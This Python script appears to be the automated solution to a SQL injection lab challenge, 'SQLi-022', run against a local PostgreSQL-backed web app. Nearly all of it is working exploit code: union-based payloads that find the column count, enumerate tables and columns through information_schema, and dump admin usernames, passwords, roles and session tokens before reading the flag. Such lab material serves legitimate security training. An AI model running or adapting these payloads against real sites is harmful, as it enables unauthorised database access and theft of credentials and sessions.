#!/usr/bin/env python3
"""
SQLi-022: PostgreSQL Union-based Multi Row Exploit
Automated exploitation using STRING_AGG
"""

import requests
import sys
from urllib.parse import quote
import re

BASE_URL = "http://localhost:5022"

def inject(payload):
    """Send payload and return response"""
    url = f"{BASE_URL}/department?id={quote(payload)}"
    try:
        resp = requests.get(url, timeout=10)
        return resp.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def extract_employees(html):
    """Extract employee data from HTML"""
    employees = []
    pattern = r'<div class="name">(.*?)</div>\s*<div class="email">(.*?)</div>'
    matches = re.findall(pattern, html, re.DOTALL)
    for name, email in matches:
        employees.append({'name': name.strip(), 'email': email.strip()})
    return employees

def main():
    print("=" * 60)
    print("SQLi-022: PostgreSQL Union-based Multi Row Exploit")
    print("=" * 60)
    
    # Step 1: Test injection
    print("\n[*] Step 1: Testing SQL Injection...")
    payload = "1 AND 1=1"
    html = inject(payload)
    if html and "employee" in html.lower():
        print("[+] SQL Injection confirmed!")
    
    # Step 2: Find column count
    print("\n[*] Step 2: Finding column count...")
    for i in range(1, 10):
        cols = ','.join(['NULL'] * i)
        payload = f"0 UNION SELECT {cols}--"
        html = inject(payload)
        if html and "error" not in html.lower():
            print(f"[+] Column count: {i}")
            break
    
    # Step 3: Get current user
    print("\n[*] Step 3: Getting current user...")
    payload = "0 UNION SELECT current_user,'',''--"
    html = inject(payload)
    employees = extract_employees(html)
    for emp in employees:
        print(f"[+] Current user: {emp['name']}")
    
    # Step 4: Enumerate tables
    print("\n[*] Step 4: Enumerating tables...")
    payload = "0 UNION SELECT STRING_AGG(table_name,','),'','' FROM information_schema.tables WHERE table_schema='public'--"
    html = inject(payload)
    employees = extract_employees(html)
    for emp in employees:
        if emp['name']:
            print(f"[+] Tables: {emp['name']}")
    
    # Step 5: Enumerate admin_credentials columns
    print("\n[*] Step 5: Enumerating admin_credentials columns...")
    payload = "0 UNION SELECT STRING_AGG(column_name,','),'','' FROM information_schema.columns WHERE table_name='admin_credentials'--"
    html = inject(payload)
    employees = extract_employees(html)
    for emp in employees:
        if emp['name']:
            print(f"[+] Columns: {emp['name']}")
    
    # Step 6: Extract all admin credentials
    print("\n[*] Step 6: Extracting admin credentials...")
    payload = "0 UNION SELECT STRING_AGG(username||':'||password||':'||role,' | '),'','' FROM admin_credentials--"
    html = inject(payload)
    employees = extract_employees(html)
    for emp in employees:
        if emp['name']:
            print("[+] Admin credentials:")
            for cred in emp['name'].split(' | '):
                print(f"    {cred}")
    
    # Step 7: Extract session tokens
    print("\n[*] Step 7: Extracting session tokens...")
    payload = "0 UNION SELECT STRING_AGG(username||':'||session_token,' | '),'','' FROM admin_credentials--"
    html = inject(payload)
    employees = extract_employees(html)
    for emp in employees:
        if emp['name']:
            print("[+] Session tokens:")
            for token in emp['name'].split(' | '):
                print(f"    {token}")
    
    # Step 8: Extract flag
    print("\n[*] Step 8: Extracting flag...")
    payload = "0 UNION SELECT value,'','' FROM flags WHERE name='sqli_022'--"
    html = inject(payload)
    employees = extract_employees(html)
    for emp in employees:
        if emp['name'] and 'FLAG' in emp['name']:
            print(f"\n[+] FLAG FOUND: {emp['name']}")
    
    print("\n" + "=" * 60)
    print("Exploitation completed!")
    print("=" * 60)

if __name__ == "__main__":
    main()
